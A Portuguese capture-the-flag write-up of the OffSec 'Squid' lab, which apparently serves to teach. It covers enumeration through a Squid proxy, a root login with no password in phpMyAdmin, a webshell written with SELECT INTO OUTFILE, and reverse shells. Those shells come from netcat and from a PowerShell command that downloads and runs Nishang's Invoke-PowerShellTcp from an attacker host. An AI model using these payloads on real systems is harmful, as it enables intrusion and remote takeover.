---
title:     "OffSec Proving Grounds - Squid"
tags: [Windows,easy,OffSec,phpmyadmin]
categories: OffSecProvingGrounds
---

## Enumeration

A primeira etapa do processo de exploração começou com a enumeração da máquina alvo utilizando o **Nmap**. Inicialmente, foi realizado um **scan de portas completo** para identificar todos os serviços em execução na máquina **Squid**. 

```
nmap -T4 -p- -v squid -oN nmap-all-ports.log
```

Esse comando varreu todas as portas (0-65535) com a finalidade de descobrir quais estavam abertas, salvando os resultados no arquivo `nmap-all-ports.log` para análise posterior.

Após identificar as portas em uso, foi executado um **scan mais detalhado** nas portas mais relevantes, focando na detecção de versões e nos scripts padrões do Nmap. 

```
sudo nmap -T4 -sCV -p135,139,445,3128,49666,49667 squid -oN enu/nmap-services.log
```

Este segundo scan permitiu coletar mais informações sobre os serviços específicos rodando nas portas identificadas: **135, 139, 445, 3128, 49666, 49667**. Os resultados detalhados foram armazenados em `enu/nmap-services.log`, servindo como base para as próximas etapas de exploração.

### Enumeração através do Proxy Squid

Após a enumeração inicial das portas e serviços, identifiquei que a porta **3128** estava associada ao serviço **Squid**, um proxy bastante utilizado. Para explorar mais a fundo os serviços acessíveis através desse proxy, utilizei a ferramenta **Squid Pivoting Open Port Scanner (spose.py)**, que é particularmente eficaz em cenários de **CTF** e em testes de penetração, onde o objetivo é detectar portas abertas por trás de um proxy Squid.

```
python3 spose.py --proxy http://squid:3128 --target 192.168.185.189
```
![image](https://github.com/user-attachments/assets/3768bfd2-578a-4f20-b596-9b8efa341d1c)

Com esse comando, a **spose.py** foi configurada para usar o proxy **Squid** (acessível via porta **3128**) para escanear as portas abertas no alvo **192.168.185.189**. Essa técnica permitiu realizar a enumeração de portas através do proxy, oferecendo uma visão mais completa das portas e serviços que poderiam ser explorados posteriormente.

A **spose.py** é uma ferramenta desenvolvida para funcionar exclusivamente com **Python 3**, e sua função principal é detectar portas abertas em sistemas remotos quando o tráfego é roteado através de um proxy HTTP, como o Squid. Essa técnica é especialmente útil quando se busca realizar pivoting, utilizando o proxy como intermediário para mapear a rede interna ou alcançar alvos que normalmente estariam inacessíveis.

Para mais detalhes e acesso ao código-fonte da ferramenta, ela pode ser encontrada no GitHub:

[Spose - Squid Pivoting Open Port Scanner](https://github.com/aancw/spose)

Além disso, consultei o [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid), um recurso valioso para testes de penetração, que forneceu insights adicionais sobre como o serviço Squid pode ser utilizado em cenários de pentest e CTF.

Depois de identificar as portas abertas por trás do proxy Squid, a próxima etapa foi acessar a porta **8080**. Para isso, foi necessário configurar o **Squid proxy** no navegador.

### Configurando o Squid Proxy no Navegador

1. **Abra as configurações de rede do seu navegador** (geralmente encontrado nas configurações avançadas).
2. **Localize a seção de proxy** e selecione a opção para configuração manual de proxy.
3. **Insira o IP da máquina Squid** seguido da porta **3128** na seção HTTP Proxy. 

   - **IP da Máquina Squid:** `192.168.185.189`
   - **Porta:** `3128`

4. **Salve as configurações** e aplique o proxy.

### Acessando a Porta 8080

Com o proxy configurado, você pode acessar a porta **8080** através do navegador digitando na barra de endereços:

```
http://192.168.185.189:8080
```

![image](https://github.com/user-attachments/assets/c0c2dcc5-9666-4fb1-bcea-8831ac40c7bd)

Isso permitirá que você visualize o serviço em execução na porta **8080** através do proxy Squid.

### Próximos Passos

Depois de acessar a porta **8080**, a análise deve continuar para identificar a natureza do serviço em execução nessa porta. Isso pode incluir a identificação de um painel de administração, uma aplicação web vulnerável ou qualquer outro tipo de serviço que possa ser explorado. Dependendo do que for encontrado, as próximas etapas podem envolver testes de penetração mais profundos, como exploração de vulnerabilidades, escalonamento de privilégios ou a captura de credenciais.

### Continuando com a Enumeração

Após acessar a porta **8080** e explorar o serviço disponível, é crucial continuar a enumeração e procurar por elementos que possam ser explorados. Ao navegar pela página, observe cuidadosamente todos os detalhes, pois muitas vezes há pistas que podem levar a vulnerabilidades.

Se você prestar atenção, no final da página existem **aliases** que redirecionam para recursos como `phpinfo`, `phpmyadmin`, `adminer`, entre outros. Esses aliases podem fornecer informações valiosas ou ser pontos de entrada para exploração adicional.

#### Explorando o `phpinfo`

O **phpinfo** é uma página que exibe a configuração do PHP e pode revelar informações críticas, como diretórios do servidor, caminhos de arquivos e outras configurações que podem ser exploradas. É comum encontrar detalhes sobre diretórios onde podemos tentar escrever um **payload malicioso**.

#### Tentativa de Login com Senhas Padrão

Sempre que você encontrar páginas de login, como `phpmyadmin` ou `adminer`, tente acessar utilizando senhas padrão. Muitos administradores esquecem de alterar as credenciais de login, deixando o sistema vulnerável a acessos não autorizados. 

Aqui estão alguns exemplos de credenciais padrão que você pode tentar:

- **admin:admin**
- **admin:** *(sem senha)*
- **admin:password**

Se você não souber a senha padrão para um produto específico, uma simples pesquisa no Google com o nome do produto e "default password" geralmente fornece as credenciais padrão. Em muitos casos, o próprio site do fornecedor lista as senhas padrão para os produtos.

![image](https://github.com/user-attachments/assets/23f7c87e-b34f-420c-b12b-0c0ed27abf88)

### Acesso Ganhado: Login como `root` sem Senha no phpMyAdmin

Durante a exploração das páginas disponíveis, ao tentar acessar o **phpMyAdmin** com o usuário **root** e sem senha, consegui obter acesso ao banco de dados.

Este tipo de vulnerabilidade é crítica, pois o phpMyAdmin é uma ferramenta de administração para bancos de dados MySQL, e o acesso como **root** sem senha concede controle total sobre todos os bancos de dados no servidor. Isso pode incluir a capacidade de visualizar, modificar ou excluir dados, além de executar comandos SQL diretamente no banco de dados.

#### Próximos Passos

Com o acesso root ao phpMyAdmin garantido, a próxima fase envolve:

1. **Verificação dos bancos de dados:** Navegue pelos bancos de dados disponíveis para identificar informações sensíveis, como tabelas que contenham credenciais de usuários, dados pessoais ou outras informações confidenciais.

2. **Execução de comandos SQL:** Utilize a interface do phpMyAdmin para executar comandos SQL que possam ajudar a explorar mais profundamente o sistema. Isso pode incluir a criação de novos usuários com privilégios elevados ou a injeção de comandos maliciosos para obter acesso ao sistema operacional subjacente.

3. **Upload de backdoors:** Se o phpMyAdmin permitir, utilize a funcionalidade de importação de arquivos para enviar um **webshell** ou outro tipo de **payload malicioso** que possa ser executado diretamente no servidor.

4. **Escalabilidade:** Avalie a possibilidade de usar o acesso ao banco de dados para escalar privilégios dentro do sistema, ou para comprometer outros sistemas na rede.

5. **Análise de logs:** Verifique se há logs ou registros de atividades no phpMyAdmin que possam ser úteis para mapear outras atividades suspeitas ou para encobrir rastros.


## Exploitation

### Shell Uploading no Servidor Web via phpMyAdmin

Com o acesso root ao phpMyAdmin garantido, podemos agora explorar o sistema mais profundamente utilizando técnicas de **shell uploading**. Usaremos o artigo [Shell Uploading in Web Server through PhpMyAdmin](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/) como ponto de apoio para ajudar na nossa exploração.

### Criando uma Shell no Servidor Web

1. **Criação de uma nova database:**
   Primeiramente, crie uma nova base de dados no phpMyAdmin para realizar a exploração. No exemplo, criamos uma database chamada `anakein`.

   ![image](https://github.com/user-attachments/assets/556a160a-5c9a-4e19-8316-17da7308f8e6)


3. **Injeção de código PHP malicioso:**
   Em seguida, execute o seguinte comando SQL na nova database para criar um arquivo de shell PHP no servidor web:

   ```
   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp/www/shell.php';
   ```

   ![image](https://github.com/user-attachments/assets/e38c460b-79e8-441c-b8d2-8ce3a7a33dea)

   Esse comando cria um arquivo chamado shell.php no diretório C:/wamp/www/ do servidor web. O arquivo contém um simples script PHP que executa comandos passados via URL.

   Verificação da criação da shell: Para verificar se o arquivo shell.php foi criado corretamente, acesse a URL a seguir no navegador:

   http://192.168.185.189:8080/shell.php?cmd=dir

   ![image](https://github.com/user-attachments/assets/bdc95e53-cfae-4619-9525-650dec95e455)

    Se a página listar os diretórios do Windows, significa que a shell foi criada com sucesso e está funcionando corretamente.

### Próximos Passos: Obtendo uma Reverse Shell

Agora que temos uma shell funcional, o próximo objetivo é obter uma reverse shell para ganhar acesso remoto ao sistema com mais controle. Isso pode ser feito executando um comando através da shell que conecte o servidor de volta ao seu sistema, permitindo que você interaja com o sistema operacional diretamente.

Aqui está um exemplo de comando que pode ser utilizado para obter uma reverse shell:

http://192.168.185.189:8080/shell.php?cmd=nc -e cmd.exe [YOUR_IP] [PORT]

    [YOUR_IP]: Substitua pelo seu endereço IP.
    [PORT]: Substitua pela porta que você estará ouvindo.

Antes de executar o comando acima, certifique-se de ter uma sessão de netcat escutando na porta especificada:

```
nc -lvnp [PORT]
```

Se tudo correr bem, você deverá obter uma conexão reverse shell, permitindo explorar o sistema alvo com privilégios de linha de comando.

### Obtendo a Reverse Shell com Nishang

Para obter uma reverse shell mais robusta, utilizei o **Nishang**, um framework de PowerShell, que oferece diversos scripts úteis para pentesters. Especificamente, utilizei o payload **Invoke-PowerShellTcp.ps1** para estabelecer a conexão.

#### Execução do Payload

Utilizei o seguinte comando via shell PHP para executar o payload do Nishang e obter uma reverse shell:

```
http://192.168.185.189:8080/shell.php?cmd=powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20-Command%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://192.168.45.171/Invoke-PowerShellTcp.ps1%27);%20Invoke-PowerShellTcp%20-Reverse%20-IPAddress%20192.168.45.171%20-Port%20443
```

- **IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.171/Invoke-PowerShellTcp.ps1')**: Esse trecho do comando baixa e executa o script `Invoke-PowerShellTcp.ps1` diretamente da minha máquina atacante.
- **Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.171 -Port 443**: Essa parte do comando executa o script baixado, instruindo-o a iniciar uma conexão reverse shell de volta para minha máquina, especificando o endereço IP e a porta.

#### Preparação da Máquina Atacante

Antes de executar o payload, certifique-se de que sua máquina atacante esteja preparada para receber a conexão. Para isso, utilize o **netcat** ou outra ferramenta de escuta na porta especificada:

```
nc -lvnp 443
```

![image](https://github.com/user-attachments/assets/d0275d46-4efd-40b8-8ec6-0a2ca55c6d82)

#### Resultado

Se o payload for executado corretamente, você obterá uma reverse shell com privilégios, permitindo que você interaja diretamente com o sistema operacional da máquina alvo através do terminal.

![image](https://github.com/user-attachments/assets/18646561-f3aa-42d7-96b3-df8839be472f)

### Conclusão

Utilizando o Nishang, foi possível estabelecer uma reverse shell através de um comando PowerShell, o que permitiu um controle completo sobre o sistema alvo. Essa técnica é poderosa e eficaz para cenários onde o acesso ao sistema operacional é necessário para explorar mais profundamente a máquina comprometida.

